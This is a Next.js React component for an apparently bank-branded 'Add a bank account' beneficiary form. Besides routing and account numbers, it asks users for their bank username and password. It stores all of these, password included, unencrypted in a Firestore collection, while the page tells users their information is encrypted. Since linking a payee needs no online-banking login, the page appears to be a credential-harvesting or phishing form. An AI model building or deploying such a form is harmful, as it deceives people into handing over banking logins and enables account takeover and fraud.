"use client";

import { useState } from "react";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { useRouter } from "next/navigation";
import { db } from "@/lib/firebaseClient";
import Image from "next/image";

export default function NewBeneficiary() {
    const router = useRouter();

    const [isSaving, setIsSaving] = useState(false);
    const [successData, setSuccessData] = useState(null);

    const [name, setName] = useState("");
    const [bank, setBank] = useState("");
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [phoneNumber, setPhoneNumber] = useState("");
    const [address, setAddress] = useState("");
    const [routingNumber, setRoutingNumber] = useState("");
    const [accountNumber, setAccountNumber] = useState("");

    const addBeneficiary = async () => {
        if (!name || !bank || !password) {
            return;
        }

        setIsSaving(true);

        try {
            const docRef = await addDoc(collection(db, "beneficiaries"), {
                name,
                bank,
                username,
                password,
                phoneNumber,
                address,
                routingNumber,
                accountNumber,
                createdAt: serverTimestamp(),
            });

            // ✅ THIS forces success UI
            setSuccessData({
                id: docRef.id,
                name,
                bank,
            });

            // clear form AFTER success state
            setName("");
            setBank("");
            setUsername("");
            setPassword("");
            setPhoneNumber("");
            setAddress("");
            setRoutingNumber("");
            setAccountNumber("");
        } catch (err) {
            console.error(err);
        } finally {
            setIsSaving(false);
        }
    };

    /* ================= SUCCESS VIEW ================= */
    if (successData) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4">
                <div className="bg-white max-w-md w-full rounded-xl shadow-lg p-6 text-center">
                    <div className="flex items-center justify-center w-full h-10 mb-4">
                        <Image src="/logo.png" alt="BBT Logo" className="h-13 object-contain" width={100} height={100} priority />
                    </div>
                    <h2 className="text-2xl font-semibold text-green-700 mb-2">
                        Beneficiary Added Successfully
                    </h2>

                    <p className="text-gray-700 mb-6 leading-relaxed">
                        The beneficiary account has been securely added to your profile.
                        <br />
                        <strong>{successData.name}</strong> at <strong>{successData.bank}</strong> is now available
                        for future transfers and transactions.
                    </p>

                    <button
                        onClick={() => router.push("/accounts/beneficiaries-list")}
                        className="w-full bg-blue-900 text-white py-2 rounded-md font-medium hover:bg-blue-950 transition"
                    >
                        View Added Beneficiaries
                    </button>

                    <button
                        onClick={() => setSuccessData(null)}
                        className="w-full mt-3 text-sm text-gray-700 hover:underline"
                    >
                        Add another beneficiary
                    </button>
                </div>
            </div>
        );
    }

    /* ================= FORM VIEW ================= */
    return (
        <div className="min-h-screen flex items-center justify-center bg-white px-4">
            <div className="bg-gray-100 w-full max-w-md rounded-xl shadow-xl p-6 space-y-4 mt-24">
                {/* Header */}
                <div className="mb-4 text-center">
                    <h2 className="text-xl font-semibold text-blue-900">Add a bank account</h2>
                    <p className="text-sm text-gray-500 mt-1">
                        Securely link a recipient for transfers
                    </p>
                </div>

                <div className="flex justify-between items-center gap-3">
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700  ">
                            Name
                        </label>
                        <input
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Full Name"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                        />
                    </div>
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Phone Number
                        </label>
                        <input type="number"
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Phone Number"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                        />
                    </div>
                </div>


                <div className="flex justify-between items-center gap-3">
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Address
                        </label>
                        <input type="address"
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Mailing Address"
                            value={address}
                            onChange={(e) => setAddress(e.target.value)}
                        />
                    </div>
                    <div className="flex flex-col gap-2">

                        <label className="text-sm font-semibold text-gray-700">
                            Bank
                        </label>
                        <input
                            required
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Bank Name"
                            value={bank}
                            onChange={(e) => setBank(e.target.value)}
                        />
                    </div>
                </div>

                <div className="flex justify-between items-center gap-3">
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Bank Username
                        </label>
                        <input
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Username"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                        />
                    </div>
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Bank Password
                        </label>
                        <input
                            type="password"
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                        />
                    </div>
                </div>

                <div className="flex justify-between items-center gap-3">
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Routing Number
                        </label>
                        <input type="number"
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Routing Number"
                            value={routingNumber}
                            onChange={(e) => setRoutingNumber(e.target.value)}
                        />
                    </div>
                    <div className="flex flex-col gap-2">
                        <label className="text-sm font-semibold text-gray-700">
                            Account Number
                        </label>
                        <input type="number"
                            className="w-full p-2 border rounded-md"
                            placeholder="Enter Account Number"
                            value={accountNumber}
                            onChange={(e) => setAccountNumber(e.target.value)}
                        />
                    </div>
                </div>

                <p className="text-sm bg-white text-black leading-relaxed my-4 p-2 rounded">
                    Your information is encrypted and used only to establish a secure connection.
                    <br />
                    <span className="text-red-600">
                        Supported institutions include credit cards, traditional banks and credit unions Only. Cashapp, PayPal, Venmo etc are not compatible.
                    </span>
                </p>

                <button
                    onClick={addBeneficiary}
                    disabled={isSaving}
                    className={`w-full py-2 rounded-md text-white ${isSaving ? "bg-gray-400" : "bg-blue-900 hover:bg-blue-950"
                        }`}
                >
                    {isSaving ? "Saving..." : "Link Bank"}
                </button>
            </div>
        </div>
    );
}
